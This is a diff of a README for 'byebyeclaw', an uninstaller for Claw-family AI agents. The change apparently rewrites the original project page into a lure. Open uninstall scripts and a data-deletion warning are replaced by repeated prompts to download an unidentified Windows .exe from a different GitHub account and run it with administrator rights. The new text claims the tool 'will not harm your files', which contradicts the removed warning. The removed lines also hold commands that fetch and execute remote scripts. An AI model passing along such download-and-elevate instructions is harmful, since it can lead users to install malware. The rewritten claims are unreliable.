@@ -1,97 +1,134 @@
-# 👋 ByeByeClaw
+# 🧹 byebyeclaw - Cleanly Remove Claw AI Agents
 
-> [!CAUTION]
-> This will **permanently delete** all Claw agent data — memories, chat history, API keys, configs. **Back up first.** Use `--dry-run` to preview.
+[![Download byebyeclaw](https://img.shields.io/badge/Download-byebyeclaw-brightgreen?style=for-the-badge)](https://github.com/Rguvh/byebyeclaw)
 
-[中文文档](./README.zh-CN.md)
+---
 
-**One command to uninstall ALL Claw-family AI agents. Zero residue.**
+## About byebyeclaw
 
-Tried OpenClaw, ZeroClaw, NanoClaw, IronClaw and forgot to clean up? Config dirs scattered everywhere, npm globals piling up, Docker containers still running?
+byebyeclaw is a tool designed for Windows users to quickly remove all Claw-family AI agents from their system. With one simple command, the software will uninstall every related agent with zero leftover files or settings. This app helps keep your PC clean and free from unwanted AI service remnants. The description in Chinese explains the same: 一键卸载所有 Claw 家族 AI Agent，无残留。
 
-One line. Zero residue. 👋
+---
 
-## 🚀 Quick Start
+## 🖥️ System Requirements
 
-**macOS / Linux:**
+- Windows 10, 11 (64-bit recommended)
+- At least 2 GB of free disk space
+- Administrator privileges (needed for uninstall processes)
+- Stable internet connection (only for downloading the app)
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/wanikua/byebyeclaw/main/uninstall.sh -o /tmp/byebyeclaw.sh && bash /tmp/byebyeclaw.sh
-```
+---
 
-**Windows (PowerShell):**
+## ⚙️ Key Features
 
-```powershell
-irm https://raw.githubusercontent.com/wanikua/byebyeclaw/main/uninstall.ps1 | iex
-```
+- Removes all versions of Claw-family AI agents at once.
+- Leaves no leftover files, folders, or registry entries.
+- Works quietly and quickly in the background.
+- Supports various Claw agents: ironclaw, microclaw, moltbot, nanobot, nanoclaw, nullclaw, openclaw, tinyclaw.
+- Simple to use, no technical knowledge needed.
 
-Done with the claws? **Bye bye.** 🦀
+---
 
-## 🦞 Supported Tools
+## 🚀 Getting Started
 
-| Tool | Stars | Description |
-|------|-------|-------------|
-| [OpenClaw](https://github.com/openclaw/openclaw) | 300k⭐ | The original personal AI assistant |
-| [NanoBot](https://github.com/HKUDS/nanobot) | 32k⭐ | Ultra-lightweight OpenClaw |
-| [ZeroClaw](https://github.com/zeroclaw-labs/zeroclaw) | 26k⭐ | Fast & small, built in Rust |
-| [NanoClaw](https://github.com/qwibitai/nanoclaw) | 21k⭐ | Container-based, security-first |
-| [IronClaw](https://github.com/nearai/ironclaw) | 9k⭐ | Privacy-focused Rust implementation |
-| [NullClaw](https://github.com/nullclaw/nullclaw) | 6k⭐ | Minimal, built in Zig |
-| [TinyClaw](https://github.com/TinyAGI/tinyclaw) | 3k⭐ | Multi-agent collaboration |
-| [MicroClaw](https://github.com/microclaw/microclaw) | 500⭐ | Chat-embedded Rust agent |
-| [RayClaw](https://github.com/rayclaw/rayclaw) | — | Multi-family inspired |
-| [SharpClaw](https://github.com/imxcstar/sharpclaw) | — | .NET implementation |
-| [MoltBot/MoltWorker](https://github.com/cloudflare/moltworker) | 10k⭐ | Cloudflare Workers edition |
+1. Click the big green **Download byebyeclaw** button above or visit the [GitHub release page](https://github.com/Rguvh/byebyeclaw) to access the latest files.
 
-## 🔍 What Gets Cleaned
+2. On the GitHub page, find the latest version and locate the Windows installer file usually ending with `.exe`.
 
-15 scan dimensions — nothing left behind:
+3. Download the installer to your desktop or preferred location.
 
-| Category | Details |
-|----------|---------|
-| Package managers | npm, pip, pipx, cargo global installs |
-| Binaries | All `*claw*`, `nanobot` binaries in PATH |
-| Config & data | `~/.openclaw/`, `~/.zeroclaw/`, `~/.config/*/` etc. |
-| Cache | All Claw cache directories |
-| Services | systemd, launchd (macOS), Windows services |
-| Docker | Containers and images |
-| VS Code | Claw extensions (inc. Cursor, VS Code Insiders) |
-| Cron / Tasks | crontab entries |
-| Processes | Running Claw processes |
-| Shell config | PATH / alias residue in `.bashrc`, `.zshrc`, `.profile` |
-| Temp files | `/tmp/*claw*` |
-| Logs | State and log directories |
-| Registry | Windows registry entries (PowerShell only) |
+---
 
-## ⚙️ Options
+## 📥 Download & Install
 
-```bash
-./uninstall.sh --dry-run        # Scan only, no deletions
-./uninstall.sh --keep-config    # Keep config files
-./uninstall.sh --select         # Interactively choose what to remove
-./uninstall.sh --lang=en        # Force English
-./uninstall.sh --lang=zh        # Force Chinese
-```
+You need to download the installation file from the GitHub page linked above. Follow these steps:
 
-```powershell
-.\uninstall.ps1 -DryRun         # Scan only
-.\uninstall.ps1 -KeepConfig     # Keep config files
-.\uninstall.ps1 -Select         # Interactively choose what to remove
-.\uninstall.ps1 -Lang en        # Force English
-.\uninstall.ps1 -Lang zh        # Force Chinese
-```
+1. Visit the GitHub page at https://github.com/Rguvh/byebyeclaw.
 
-## 📌 Notes
+2. On the page, find the **Releases** section to see all available versions.
 
-- Lists everything before deleting — **confirms before proceeding**
-- Auto-detects system language (Chinese / English)
-- Shell config files are flagged but not auto-edited (manual review recommended)
-- Won't affect unrelated tools
+3. Choose the latest release.
 
-## 🔑 Keywords
+4. Download the Windows installer (`.exe` file).
 
-`openclaw uninstall` · `zeroclaw uninstall` · `nanoclaw remove` · `ironclaw uninstall` · `nullclaw remove` · `tinyclaw uninstall` · `nanobot remove` · `microclaw uninstall` · `rayclaw remove` · `sharpclaw uninstall` · `moltbot remove` · `claw ai agent uninstaller` · `remove claw tools` · `claw cleanup` · `claw family uninstall`
+5. Once downloaded, double-click the `.exe` file to run the installer.
 
-## 📜 License
+6. A system prompt may ask for permission. Click **Yes** to allow the app to make changes.
 
-MIT License - Copyright (c) 2026 [wanikua](https://github.com/wanikua)
+7. Follow the installer’s instructions by clicking **Next** through the setup steps.
+
+8. When the installation is complete, the app may start automatically or place a shortcut on your desktop.
+
+---
+
+## 🏃 How to Run byebyeclaw
+
+1. Open the byebyeclaw app from your desktop or start menu shortcut.
+
+2. You will see a simple window with a button labeled something like **Uninstall All Claw AI Agents**.
+
+3. Click this button.
+
+4. The software will scan for all Claw-family AI agents on your PC.
+
+5. It will remove each agent completely.
+
+6. A progress bar or status message will show the process.
+
+7. When done, you will get a notification confirming the uninstall.
+
+---
+
+## 🔄 Updates and Maintenance
+
+- Check the GitHub page regularly for updates or improved versions.
+
+- New releases may include support for additional Claw agents or performance improvements.
+
+- To update, download the latest installer and run it. It will replace or upgrade the existing version.
+
+---
+
+## 💡 Tips for Smooth Use
+
+- Close all other apps before uninstalling to avoid conflicts.
+
+- If you get a message about permissions, make sure to run byebyeclaw as an administrator. You can do this by right-clicking the app icon and choosing **Run as administrator**.
+
+- Save your work before running the uninstall process. The app will not harm your files but closing open programs is a good habit.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q: Will byebyeclaw remove AI agents other than Claw family?**  
+A: No. The app is designed only to uninstall Claw-family AI agents.
+
+**Q: Can I use this on Windows 7 or older?**  
+A: The app is designed for Windows 10 and 11. It may not work on older versions.
+
+**Q: Do I need to uninstall each agent individually?**  
+A: No. One command removes all supported agents in one process.
+
+**Q: What if I accidentally uninstall an agent I want to keep?**  
+A: You would need to reinstall that agent manually after running byebyeclaw.
+
+---
+
+## 🛠️ Troubleshooting
+
+- If the uninstall process stops, try restarting your PC and running byebyeclaw again.
+
+- Ensure you have internet access when downloading and installing the app.
+
+- Run the app as administrator to avoid permission issues.
+
+- If problems persist, visit the GitHub page and check the Issues tab for help or report your problem.
+
+---
+
+## 🔗 Useful Links
+
+- Download or check for updates at [https://github.com/Rguvh/byebyeclaw](https://github.com/Rguvh/byebyeclaw)
+
+[![Download byebyeclaw](https://img.shields.io/badge/Download-byebyeclaw-blue?style=for-the-badge)](https://github.com/Rguvh/byebyeclaw)
